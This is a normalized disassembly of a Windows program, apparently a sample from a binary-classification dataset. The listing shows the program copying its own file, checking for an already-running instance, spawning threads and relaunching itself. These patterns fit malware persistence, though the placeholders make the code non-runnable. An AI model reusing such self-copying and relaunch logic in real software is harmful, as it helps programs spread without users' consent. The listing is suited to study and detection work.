mov eax r-xdata
call sub_4076d4
xor eax eax
push ebp
push j_sub_404de4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CoInitialize
mov eax [ rw-data ]
mov [ eax ] 0x1
call sub_48afe8
mov dl 0x1
mov eax [ r-xdata ]
call sub_48deec
mov [ rw-data ] eax
xor edx edx
push ebp
push j_sub_404de4#2
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0x14 ]
mov edx r-xdata
mov eax [ rw-data ]
call sub_48df60
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405584
lea edx [ ebp - 0x20 ]
xor eax eax
call sub_40f234
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_40a5a0
push [ ebp - 0x1c ]
lea edx [ ebp - 0x24 ]
mov eax r-xdata
call sub_4735e8
push [ ebp - 0x24 ]
push r-xdata
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x18 ]
call sub_40a26c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48fa10
mov eax [ rw-data ]
call sub_404650
retn
mov eax rw-data
mov edx [ rw-data ]
mov edx [ edx ]
call sub_405584
lea edx [ ebp - 0x34 ]
xor eax eax
call sub_40f234
mov eax [ ebp - 0x34 ]
lea edx [ ebp - 0x30 ]
call sub_40a5a0
push [ ebp - 0x30 ]
lea edx [ ebp - 0x38 ]
mov eax r-xdata
call sub_4735e8
push [ ebp - 0x38 ]
push r-xdata
lea eax [ ebp - 0x2c ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_47377c
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405584
lea edx [ ebp - 0x40 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x40 ]
lea edx [ ebp - 0x3c ]
call sub_409b7c
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x44 ]
test eax eax
je r-xdata
test eax eax
jg r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_405584
sub_48fa10
lea eax [ ebp - 0x48 ]
call sub_48b724
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_405584
lea edx [ ebp - 0x4c ]
mov eax r-xdata
call sub_4735e8
mov edx [ ebp - 0x4c ]
mov eax rw-data
call sub_405584
mov eax [ rw-data ]
test eax eax
je r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea edx [ ebp - 0x50 ]
mov eax r-xdata
call sub_4735e8
mov edx [ ebp - 0x50 ]
mov eax rw-data
call sub_405584
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_405584
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax [ rw-data ]
mov edx r-xdata
call sub_405584
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_405584
jmp r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea edx [ ebp - 0x54 ]
mov eax r-xdata
call sub_4735e8
mov edx [ ebp - 0x54 ]
mov eax rw-data
call sub_405584
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov edx r-xdata
call sub_405584
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_405584
jmp r-xdata
lea edx [ ebp - 0x80 ]
xor eax eax
call sub_40f234
mov eax [ ebp - 0x80 ]
lea edx [ ebp - 0x7c ]
call sub_45f588
mov eax [ ebp - 0x7c ]
push eax
lea edx [ ebp - 0x84 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45f588
mov edx [ ebp - 0x84 ]
pop eax
call sub_405974
je r-xdata
lea edx [ ebp - 0x74 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a5a0
push [ ebp - 0x74 ]
push [ rw-data ]
push r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a68c
push [ ebp - 0x78 ]
mov eax [ rw-data ]
mov edx 0x4
call sub_4058e0
lea edx [ ebp - 0x5c ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x5c ]
push eax
lea edx [ ebp - 0x60 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x60 ]
lea ecx [ ebp - 0x58 ]
pop edx
call sub_48550c
mov edx [ ebp - 0x58 ]
mov eax [ rw-data ]
call sub_405584
lea edx [ ebp - 0x64 ]
mov eax r-xdata
call sub_4735e8
mov edx [ ebp - 0x64 ]
mov eax rw-data
call sub_405584
lea edx [ ebp - 0x6c ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a5a0
push [ ebp - 0x6c ]
push [ rw-data ]
push r-xdata
lea edx [ ebp - 0x70 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a68c
push [ ebp - 0x70 ]
lea eax [ ebp - 0x68 ]
mov edx 0x4
call sub_4058e0
mov eax [ ebp - 0x68 ]
call sub_40a26c
test al al
je r-xdata
lea edx [ ebp - 0x138 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x138 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_473b6c
test al al
jne r-xdata
lea edx [ ebp - 0x13c ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x13c ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
push eax
push 0x0
push 0x0
push sub_48e340
push 0x0
push 0x0
call CreateThread
xor eax eax
push ebp
push j_sub_404b30
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40bc98
fstp [ rw-data ]
fwait
push [ rw-data ]
push [ rw-data ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax rw-data
call sub_40c8f8
call sub_40bcc4
fstp [ rw-data ]
fwait
push [ rw-data ]
push [ rw-data ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax rw-data
call sub_40c8f8
push [ rw-data ]
push r-xdata
push [ rw-data ]
lea eax [ ebp - 0x88 ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x88 ]
mov edx [ rw-data ]
mov edx [ edx ]
call sub_48c0a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x140 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x140 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
push eax
push 0x0
push 0x0
push r-xdata
push 0x0
push 0x0
call CreateThread
lea edx [ ebp - 0x8c ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x8c ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x144 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x144 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax 0x1
call sub_471a2c
lea edx [ ebp - 0xcc ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xcc ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x90 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a5a0
mov eax [ ebp - 0x90 ]
call sub_40a290
test al al
jne r-xdata
lea edx [ ebp - 0x148 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x148 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax 0x1
call sub_471b6c
lea edx [ ebp - 0xe4 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xe4 ]
lea edx [ ebp - 0xe0 ]
call sub_409b7c
cmp [ ebp - 0xe0 ] 0x0
je r-xdata
lea edx [ ebp - 0xd0 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xd0 ]
call sub_409edc
push eax
lea edx [ ebp - 0xd4 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xd4 ]
call sub_4059dc
push eax
lea edx [ ebp - 0xdc ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xdc ]
lea edx [ ebp - 0xd8 ]
call sub_46124c
mov eax [ ebp - 0xd8 ]
call sub_4059dc
push eax
push 0x0
call MessageBoxA
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4059dc
push eax
lea edx [ ebp - 0x98 ]
xor eax eax
call sub_40f234
mov eax [ ebp - 0x98 ]
call sub_4059dc
push eax
call CopyFileA
test eax eax
jne r-xdata
lea edx [ ebp - 0x94 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a5a0
mov eax [ ebp - 0x94 ]
call sub_40a2b4
lea edx [ ebp - 0x14c ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x14c ]
mov edx r-xdata
call sub_405974
jne r-xdata
xor eax eax
call sub_471edc
xor eax eax
call sub_47204c
lea edx [ ebp - 0xf4 ]
mov eax r-xdata
call sub_4735e8
mov edx [ ebp - 0xf4 ]
mov eax rw-data
call sub_405584
mov eax [ rw-data ]
test eax eax
je r-xdata
lea edx [ ebp - 0xe8 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xe8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0xc0 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xc0 ]
mov edx [ rw-data ]
mov edx [ edx ]
call sub_485150
mov eax [ rw-data ]
mov eax [ eax ]
call sub_485248
lea edx [ ebp - 0xc4 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xc4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x9c ]
mov eax r-xdata
call sub_4735e8
mov edx [ ebp - 0x9c ]
mov eax rw-data
call sub_405584
lea edx [ ebp - 0xa4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a5a0
push [ ebp - 0xa4 ]
push [ rw-data ]
push r-xdata
lea eax [ ebp - 0xa0 ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0xa0 ]
call sub_40a2b4
push 0x0
lea edx [ ebp - 0xac ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a5a0
push [ ebp - 0xac ]
push [ rw-data ]
push r-xdata
lea edx [ ebp - 0xb0 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a68c
push [ ebp - 0xb0 ]
lea eax [ ebp - 0xa8 ]
mov edx 0x4
call sub_4058e0
mov eax [ ebp - 0xa8 ]
call sub_4059dc
push eax
lea edx [ ebp - 0xb4 ]
xor eax eax
call sub_40f234
mov eax [ ebp - 0xb4 ]
call sub_4059dc
push eax
call CopyFileA
lea edx [ ebp - 0xb8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a5a0
push [ ebp - 0xb8 ]
push [ rw-data ]
push r-xdata
lea edx [ ebp - 0xbc ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a68c
push [ ebp - 0xbc ]
mov eax [ rw-data ]
mov edx 0x4
call sub_4058e0
lea edx [ ebp - 0x150 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x150 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_471cb4
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea edx [ ebp - 0xf0 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xf0 ]
xor edx edx
call sub_4729dc
lea edx [ ebp - 0xec ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xec ]
mov dl 0x1
call sub_4729dc
jmp r-xdata
lea edx [ ebp - 0xc8 ]
mov eax r-xdata
call sub_4735e8
mov edx [ ebp - 0xc8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_48c308
lea edx [ ebp - 0x154 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x154 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_471dec
lea edx [ ebp - 0xf8 ]
mov eax r-xdata
call sub_4735e8
mov edx [ ebp - 0xf8 ]
mov eax rw-data
call sub_405584
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_409edc
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_472924
lea edx [ ebp - 0x158 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x158 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_4722b4
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea edx [ ebp - 0x15c ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x15c ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_4721c4
lea edx [ ebp - 0xfc ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xfc ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
call sub_409edc
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_472974
push 0x0
call SetLastError
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4059dc
push eax
push 0x0
push 0x0
call sub_407978
call GetLastError
cmp eax 0xb7
jne r-xdata
call sub_4723a4
lea edx [ ebp - 0x108 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x108 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push r-xdata
lea edx [ ebp - 0x104 ]
xor eax eax
call sub_40f234
push [ ebp - 0x104 ]
push r-xdata
lea eax [ ebp - 0x100 ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x100 ]
call sub_46d36c
lea edx [ ebp - 0x160 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x160 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x0
call ExitProcess
lea edx [ ebp - 0x124 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x124 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x110 ]
xor eax eax
call sub_40f234
mov eax [ ebp - 0x110 ]
lea edx [ ebp - 0x10c ]
call sub_40a5a0
mov eax [ ebp - 0x10c ]
mov [ ebp - 0x44 ] eax
mov ebx [ ebp - 0x44 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x168 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x168 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x164 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x164 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x128 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x128 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_48bee4
push 0x1f4
call Sleep
push r-xdata
lea eax [ ebp - 0x118 ]
push eax
lea edx [ ebp - 0x120 ]
xor eax eax
call sub_40f234
mov eax [ ebp - 0x120 ]
lea edx [ ebp - 0x11c ]
call sub_40a5a0
mov eax [ ebp - 0x11c ]
mov ecx ebx
dec ecx
mov edx 0x1
call sub_405a44
push [ ebp - 0x118 ]
push r-xdata
lea eax [ ebp - 0x114 ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x114 ]
call sub_46d36c
sub ebx 0x4
mov ebx [ ebx ]
lea edx [ ebp - 0x170 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x170 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x16c ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x16c ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_48bee4
push 0x1f4
call Sleep
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a26c
test al al
je r-xdata
call sub_48c5d0
lea edx [ ebp - 0x178 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x178 ]
lea edx [ ebp - 0x174 ]
call sub_48b1f8
mov edx [ ebp - 0x174 ]
mov eax rw-data
call sub_405584
lea edx [ ebp - 0x17c ]
mov eax [ rw-data ]
call sub_409b7c
cmp [ ebp - 0x17c ] 0x0
je r-xdata
call sub_473c24
call sub_48c5d0
lea edx [ ebp - 0x12c ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x12c ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x180 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x180 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_405584
lea edx [ ebp - 0x130 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x130 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_47eaec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49065d
lea eax [ ebp - 0x184 ]
mov edx 0x50
call sub_405554
lea eax [ ebp - 0x40 ]
mov edx 0xc
call sub_405554
retn
call sub_473b6c
test al al
je r-xdata
push 0x5
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
push 0x3e8
call Sleep
push 0x0
call ExitProcess
lea edx [ ebp - 0x134 ]
xor eax eax
call sub_40f234
mov edx [ ebp - 0x134 ]
mov eax r-xdata
call sub_474f80
lea edx [ ebp - 0x184 ]
xor eax eax
call sub_40f234
mov edx [ ebp - 0x184 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax r-xdata
call sub_4754c4
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax r-xdata
call sub_4754c4
jmp r-xdata
sub_48fcc1
call sub_404f40
lea edx [ ebp - 0x8c ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x8c ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0xcc ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xcc ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x90 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a5a0
mov eax [ ebp - 0x90 ]
call sub_40a290
test al al
jne r-xdata
lea edx [ ebp - 0xe4 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xe4 ]
lea edx [ ebp - 0xe0 ]
call sub_409b7c
cmp [ ebp - 0xe0 ] 0x0
je r-xdata
lea edx [ ebp - 0xd0 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xd0 ]
call sub_409edc
push eax
lea edx [ ebp - 0xd4 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xd4 ]
call sub_4059dc
push eax
lea edx [ ebp - 0xdc ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xdc ]
lea edx [ ebp - 0xd8 ]
call sub_46124c
mov eax [ ebp - 0xd8 ]
call sub_4059dc
push eax
push 0x0
call MessageBoxA
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4059dc
push eax
lea edx [ ebp - 0x98 ]
xor eax eax
call sub_40f234
mov eax [ ebp - 0x98 ]
call sub_4059dc
push eax
call CopyFileA
test eax eax
jne r-xdata
lea edx [ ebp - 0x94 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a5a0
mov eax [ ebp - 0x94 ]
call sub_40a2b4
lea edx [ ebp - 0xf4 ]
mov eax r-xdata
call sub_4735e8
mov edx [ ebp - 0xf4 ]
mov eax rw-data
call sub_405584
mov eax [ rw-data ]
test eax eax
je r-xdata
lea edx [ ebp - 0xe8 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xe8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0xc0 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xc0 ]
mov edx [ rw-data ]
mov edx [ edx ]
call sub_485150
mov eax [ rw-data ]
mov eax [ eax ]
call sub_485248
lea edx [ ebp - 0xc4 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xc4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x9c ]
mov eax r-xdata
call sub_4735e8
mov edx [ ebp - 0x9c ]
mov eax rw-data
call sub_405584
lea edx [ ebp - 0xa4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a5a0
push [ ebp - 0xa4 ]
push [ rw-data ]
push r-xdata
lea eax [ ebp - 0xa0 ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0xa0 ]
call sub_40a2b4
push 0x0
lea edx [ ebp - 0xac ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a5a0
push [ ebp - 0xac ]
push [ rw-data ]
push r-xdata
lea edx [ ebp - 0xb0 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a68c
push [ ebp - 0xb0 ]
lea eax [ ebp - 0xa8 ]
mov edx 0x4
call sub_4058e0
mov eax [ ebp - 0xa8 ]
call sub_4059dc
push eax
lea edx [ ebp - 0xb4 ]
xor eax eax
call sub_40f234
mov eax [ ebp - 0xb4 ]
call sub_4059dc
push eax
call CopyFileA
lea edx [ ebp - 0xb8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a5a0
push [ ebp - 0xb8 ]
push [ rw-data ]
push r-xdata
lea edx [ ebp - 0xbc ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a68c
push [ ebp - 0xbc ]
mov eax [ rw-data ]
mov edx 0x4
call sub_4058e0
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea edx [ ebp - 0xf0 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xf0 ]
xor edx edx
call sub_4729dc
lea edx [ ebp - 0xec ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xec ]
mov dl 0x1
call sub_4729dc
jmp r-xdata
lea edx [ ebp - 0xc8 ]
mov eax r-xdata
call sub_4735e8
mov edx [ ebp - 0xc8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_48c308
lea edx [ ebp - 0xf8 ]
mov eax r-xdata
call sub_4735e8
mov edx [ ebp - 0xf8 ]
mov eax rw-data
call sub_405584
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_409edc
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_472924
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea edx [ ebp - 0xfc ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0xfc ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
call sub_409edc
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_472974
lea edx [ ebp - 0x108 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x108 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push r-xdata
lea edx [ ebp - 0x104 ]
xor eax eax
call sub_40f234
push [ ebp - 0x104 ]
push r-xdata
lea eax [ ebp - 0x100 ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x100 ]
call sub_46d36c
lea edx [ ebp - 0x124 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x124 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x110 ]
xor eax eax
call sub_40f234
mov eax [ ebp - 0x110 ]
lea edx [ ebp - 0x10c ]
call sub_40a5a0
mov eax [ ebp - 0x10c ]
mov [ ebp - 0x44 ] eax
mov ebx [ ebp - 0x44 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x128 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_48bee4
push 0x1f4
call Sleep
push r-xdata
lea eax [ ebp - 0x118 ]
push eax
lea edx [ ebp - 0x120 ]
xor eax eax
call sub_40f234
mov eax [ ebp - 0x120 ]
lea edx [ ebp - 0x11c ]
call sub_40a5a0
mov eax [ ebp - 0x11c ]
mov ecx ebx
dec ecx
mov edx 0x1
call sub_405a44
push [ ebp - 0x118 ]
push r-xdata
lea eax [ ebp - 0x114 ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x114 ]
call sub_46d36c
sub ebx 0x4
mov ebx [ ebx ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40a26c
test al al
je r-xdata
call sub_48c5d0
lea edx [ ebp - 0x138 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x138 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x12c ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x12c ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x13c ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x13c ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
push eax
push 0x0
push 0x0
push sub_48e340
push 0x0
push 0x0
call CreateThread
lea edx [ ebp - 0x130 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x130 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x140 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x140 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
push eax
push 0x0
push 0x0
push r-xdata
push 0x0
push 0x0
call CreateThread
push 0x5
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
push 0x3e8
call Sleep
push 0x0
call ExitProcess
lea edx [ ebp - 0x134 ]
xor eax eax
call sub_40f234
mov edx [ ebp - 0x134 ]
mov eax r-xdata
call sub_474f80
lea edx [ ebp - 0x144 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x144 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax 0x1
call sub_471a2c
lea edx [ ebp - 0x148 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x148 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax 0x1
call sub_471b6c
lea edx [ ebp - 0x14c ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x14c ]
mov edx r-xdata
call sub_405974
jne r-xdata
xor eax eax
call sub_471edc
xor eax eax
call sub_47204c
lea edx [ ebp - 0x150 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x150 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_471cb4
lea edx [ ebp - 0x154 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x154 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_471dec
lea edx [ ebp - 0x158 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x158 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_4722b4
lea edx [ ebp - 0x15c ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x15c ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_4721c4
push 0x0
call SetLastError
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4059dc
push eax
push 0x0
push 0x0
call sub_407978
call GetLastError
cmp eax 0xb7
jne r-xdata
call sub_4723a4
lea edx [ ebp - 0x160 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x160 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x0
call ExitProcess
lea edx [ ebp - 0x168 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x168 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x164 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x164 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x170 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x170 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x16c ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x16c ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_48bee4
push 0x1f4
call Sleep
lea edx [ ebp - 0x178 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x178 ]
lea edx [ ebp - 0x174 ]
call sub_48b1f8
mov edx [ ebp - 0x174 ]
mov eax rw-data
call sub_405584
lea edx [ ebp - 0x17c ]
mov eax [ rw-data ]
call sub_409b7c
cmp [ ebp - 0x17c ] 0x0
je r-xdata
call sub_473c24
call sub_48c5d0
lea edx [ ebp - 0x180 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x180 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_405584
call sub_47eaec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49065d
lea eax [ ebp - 0x184 ]
mov edx 0x50
call sub_405554
lea eax [ ebp - 0x40 ]
mov edx 0xc
call sub_405554
retn
call sub_473b6c
test al al
je r-xdata
lea edx [ ebp - 0x184 ]
xor eax eax
call sub_40f234
mov edx [ ebp - 0x184 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax r-xdata
call sub_4754c4
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax r-xdata
call sub_4754c4
jmp r-xdata
sub_401163
[ eax + 0x11 ]
sub_401192
call [ eax + 0x244483cc ]
add al 0xf8
jmp sub_4070b8
sub_40119f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4070e0
sub_4011a9
add [ esp + 0x4 ] 0xfffffff8
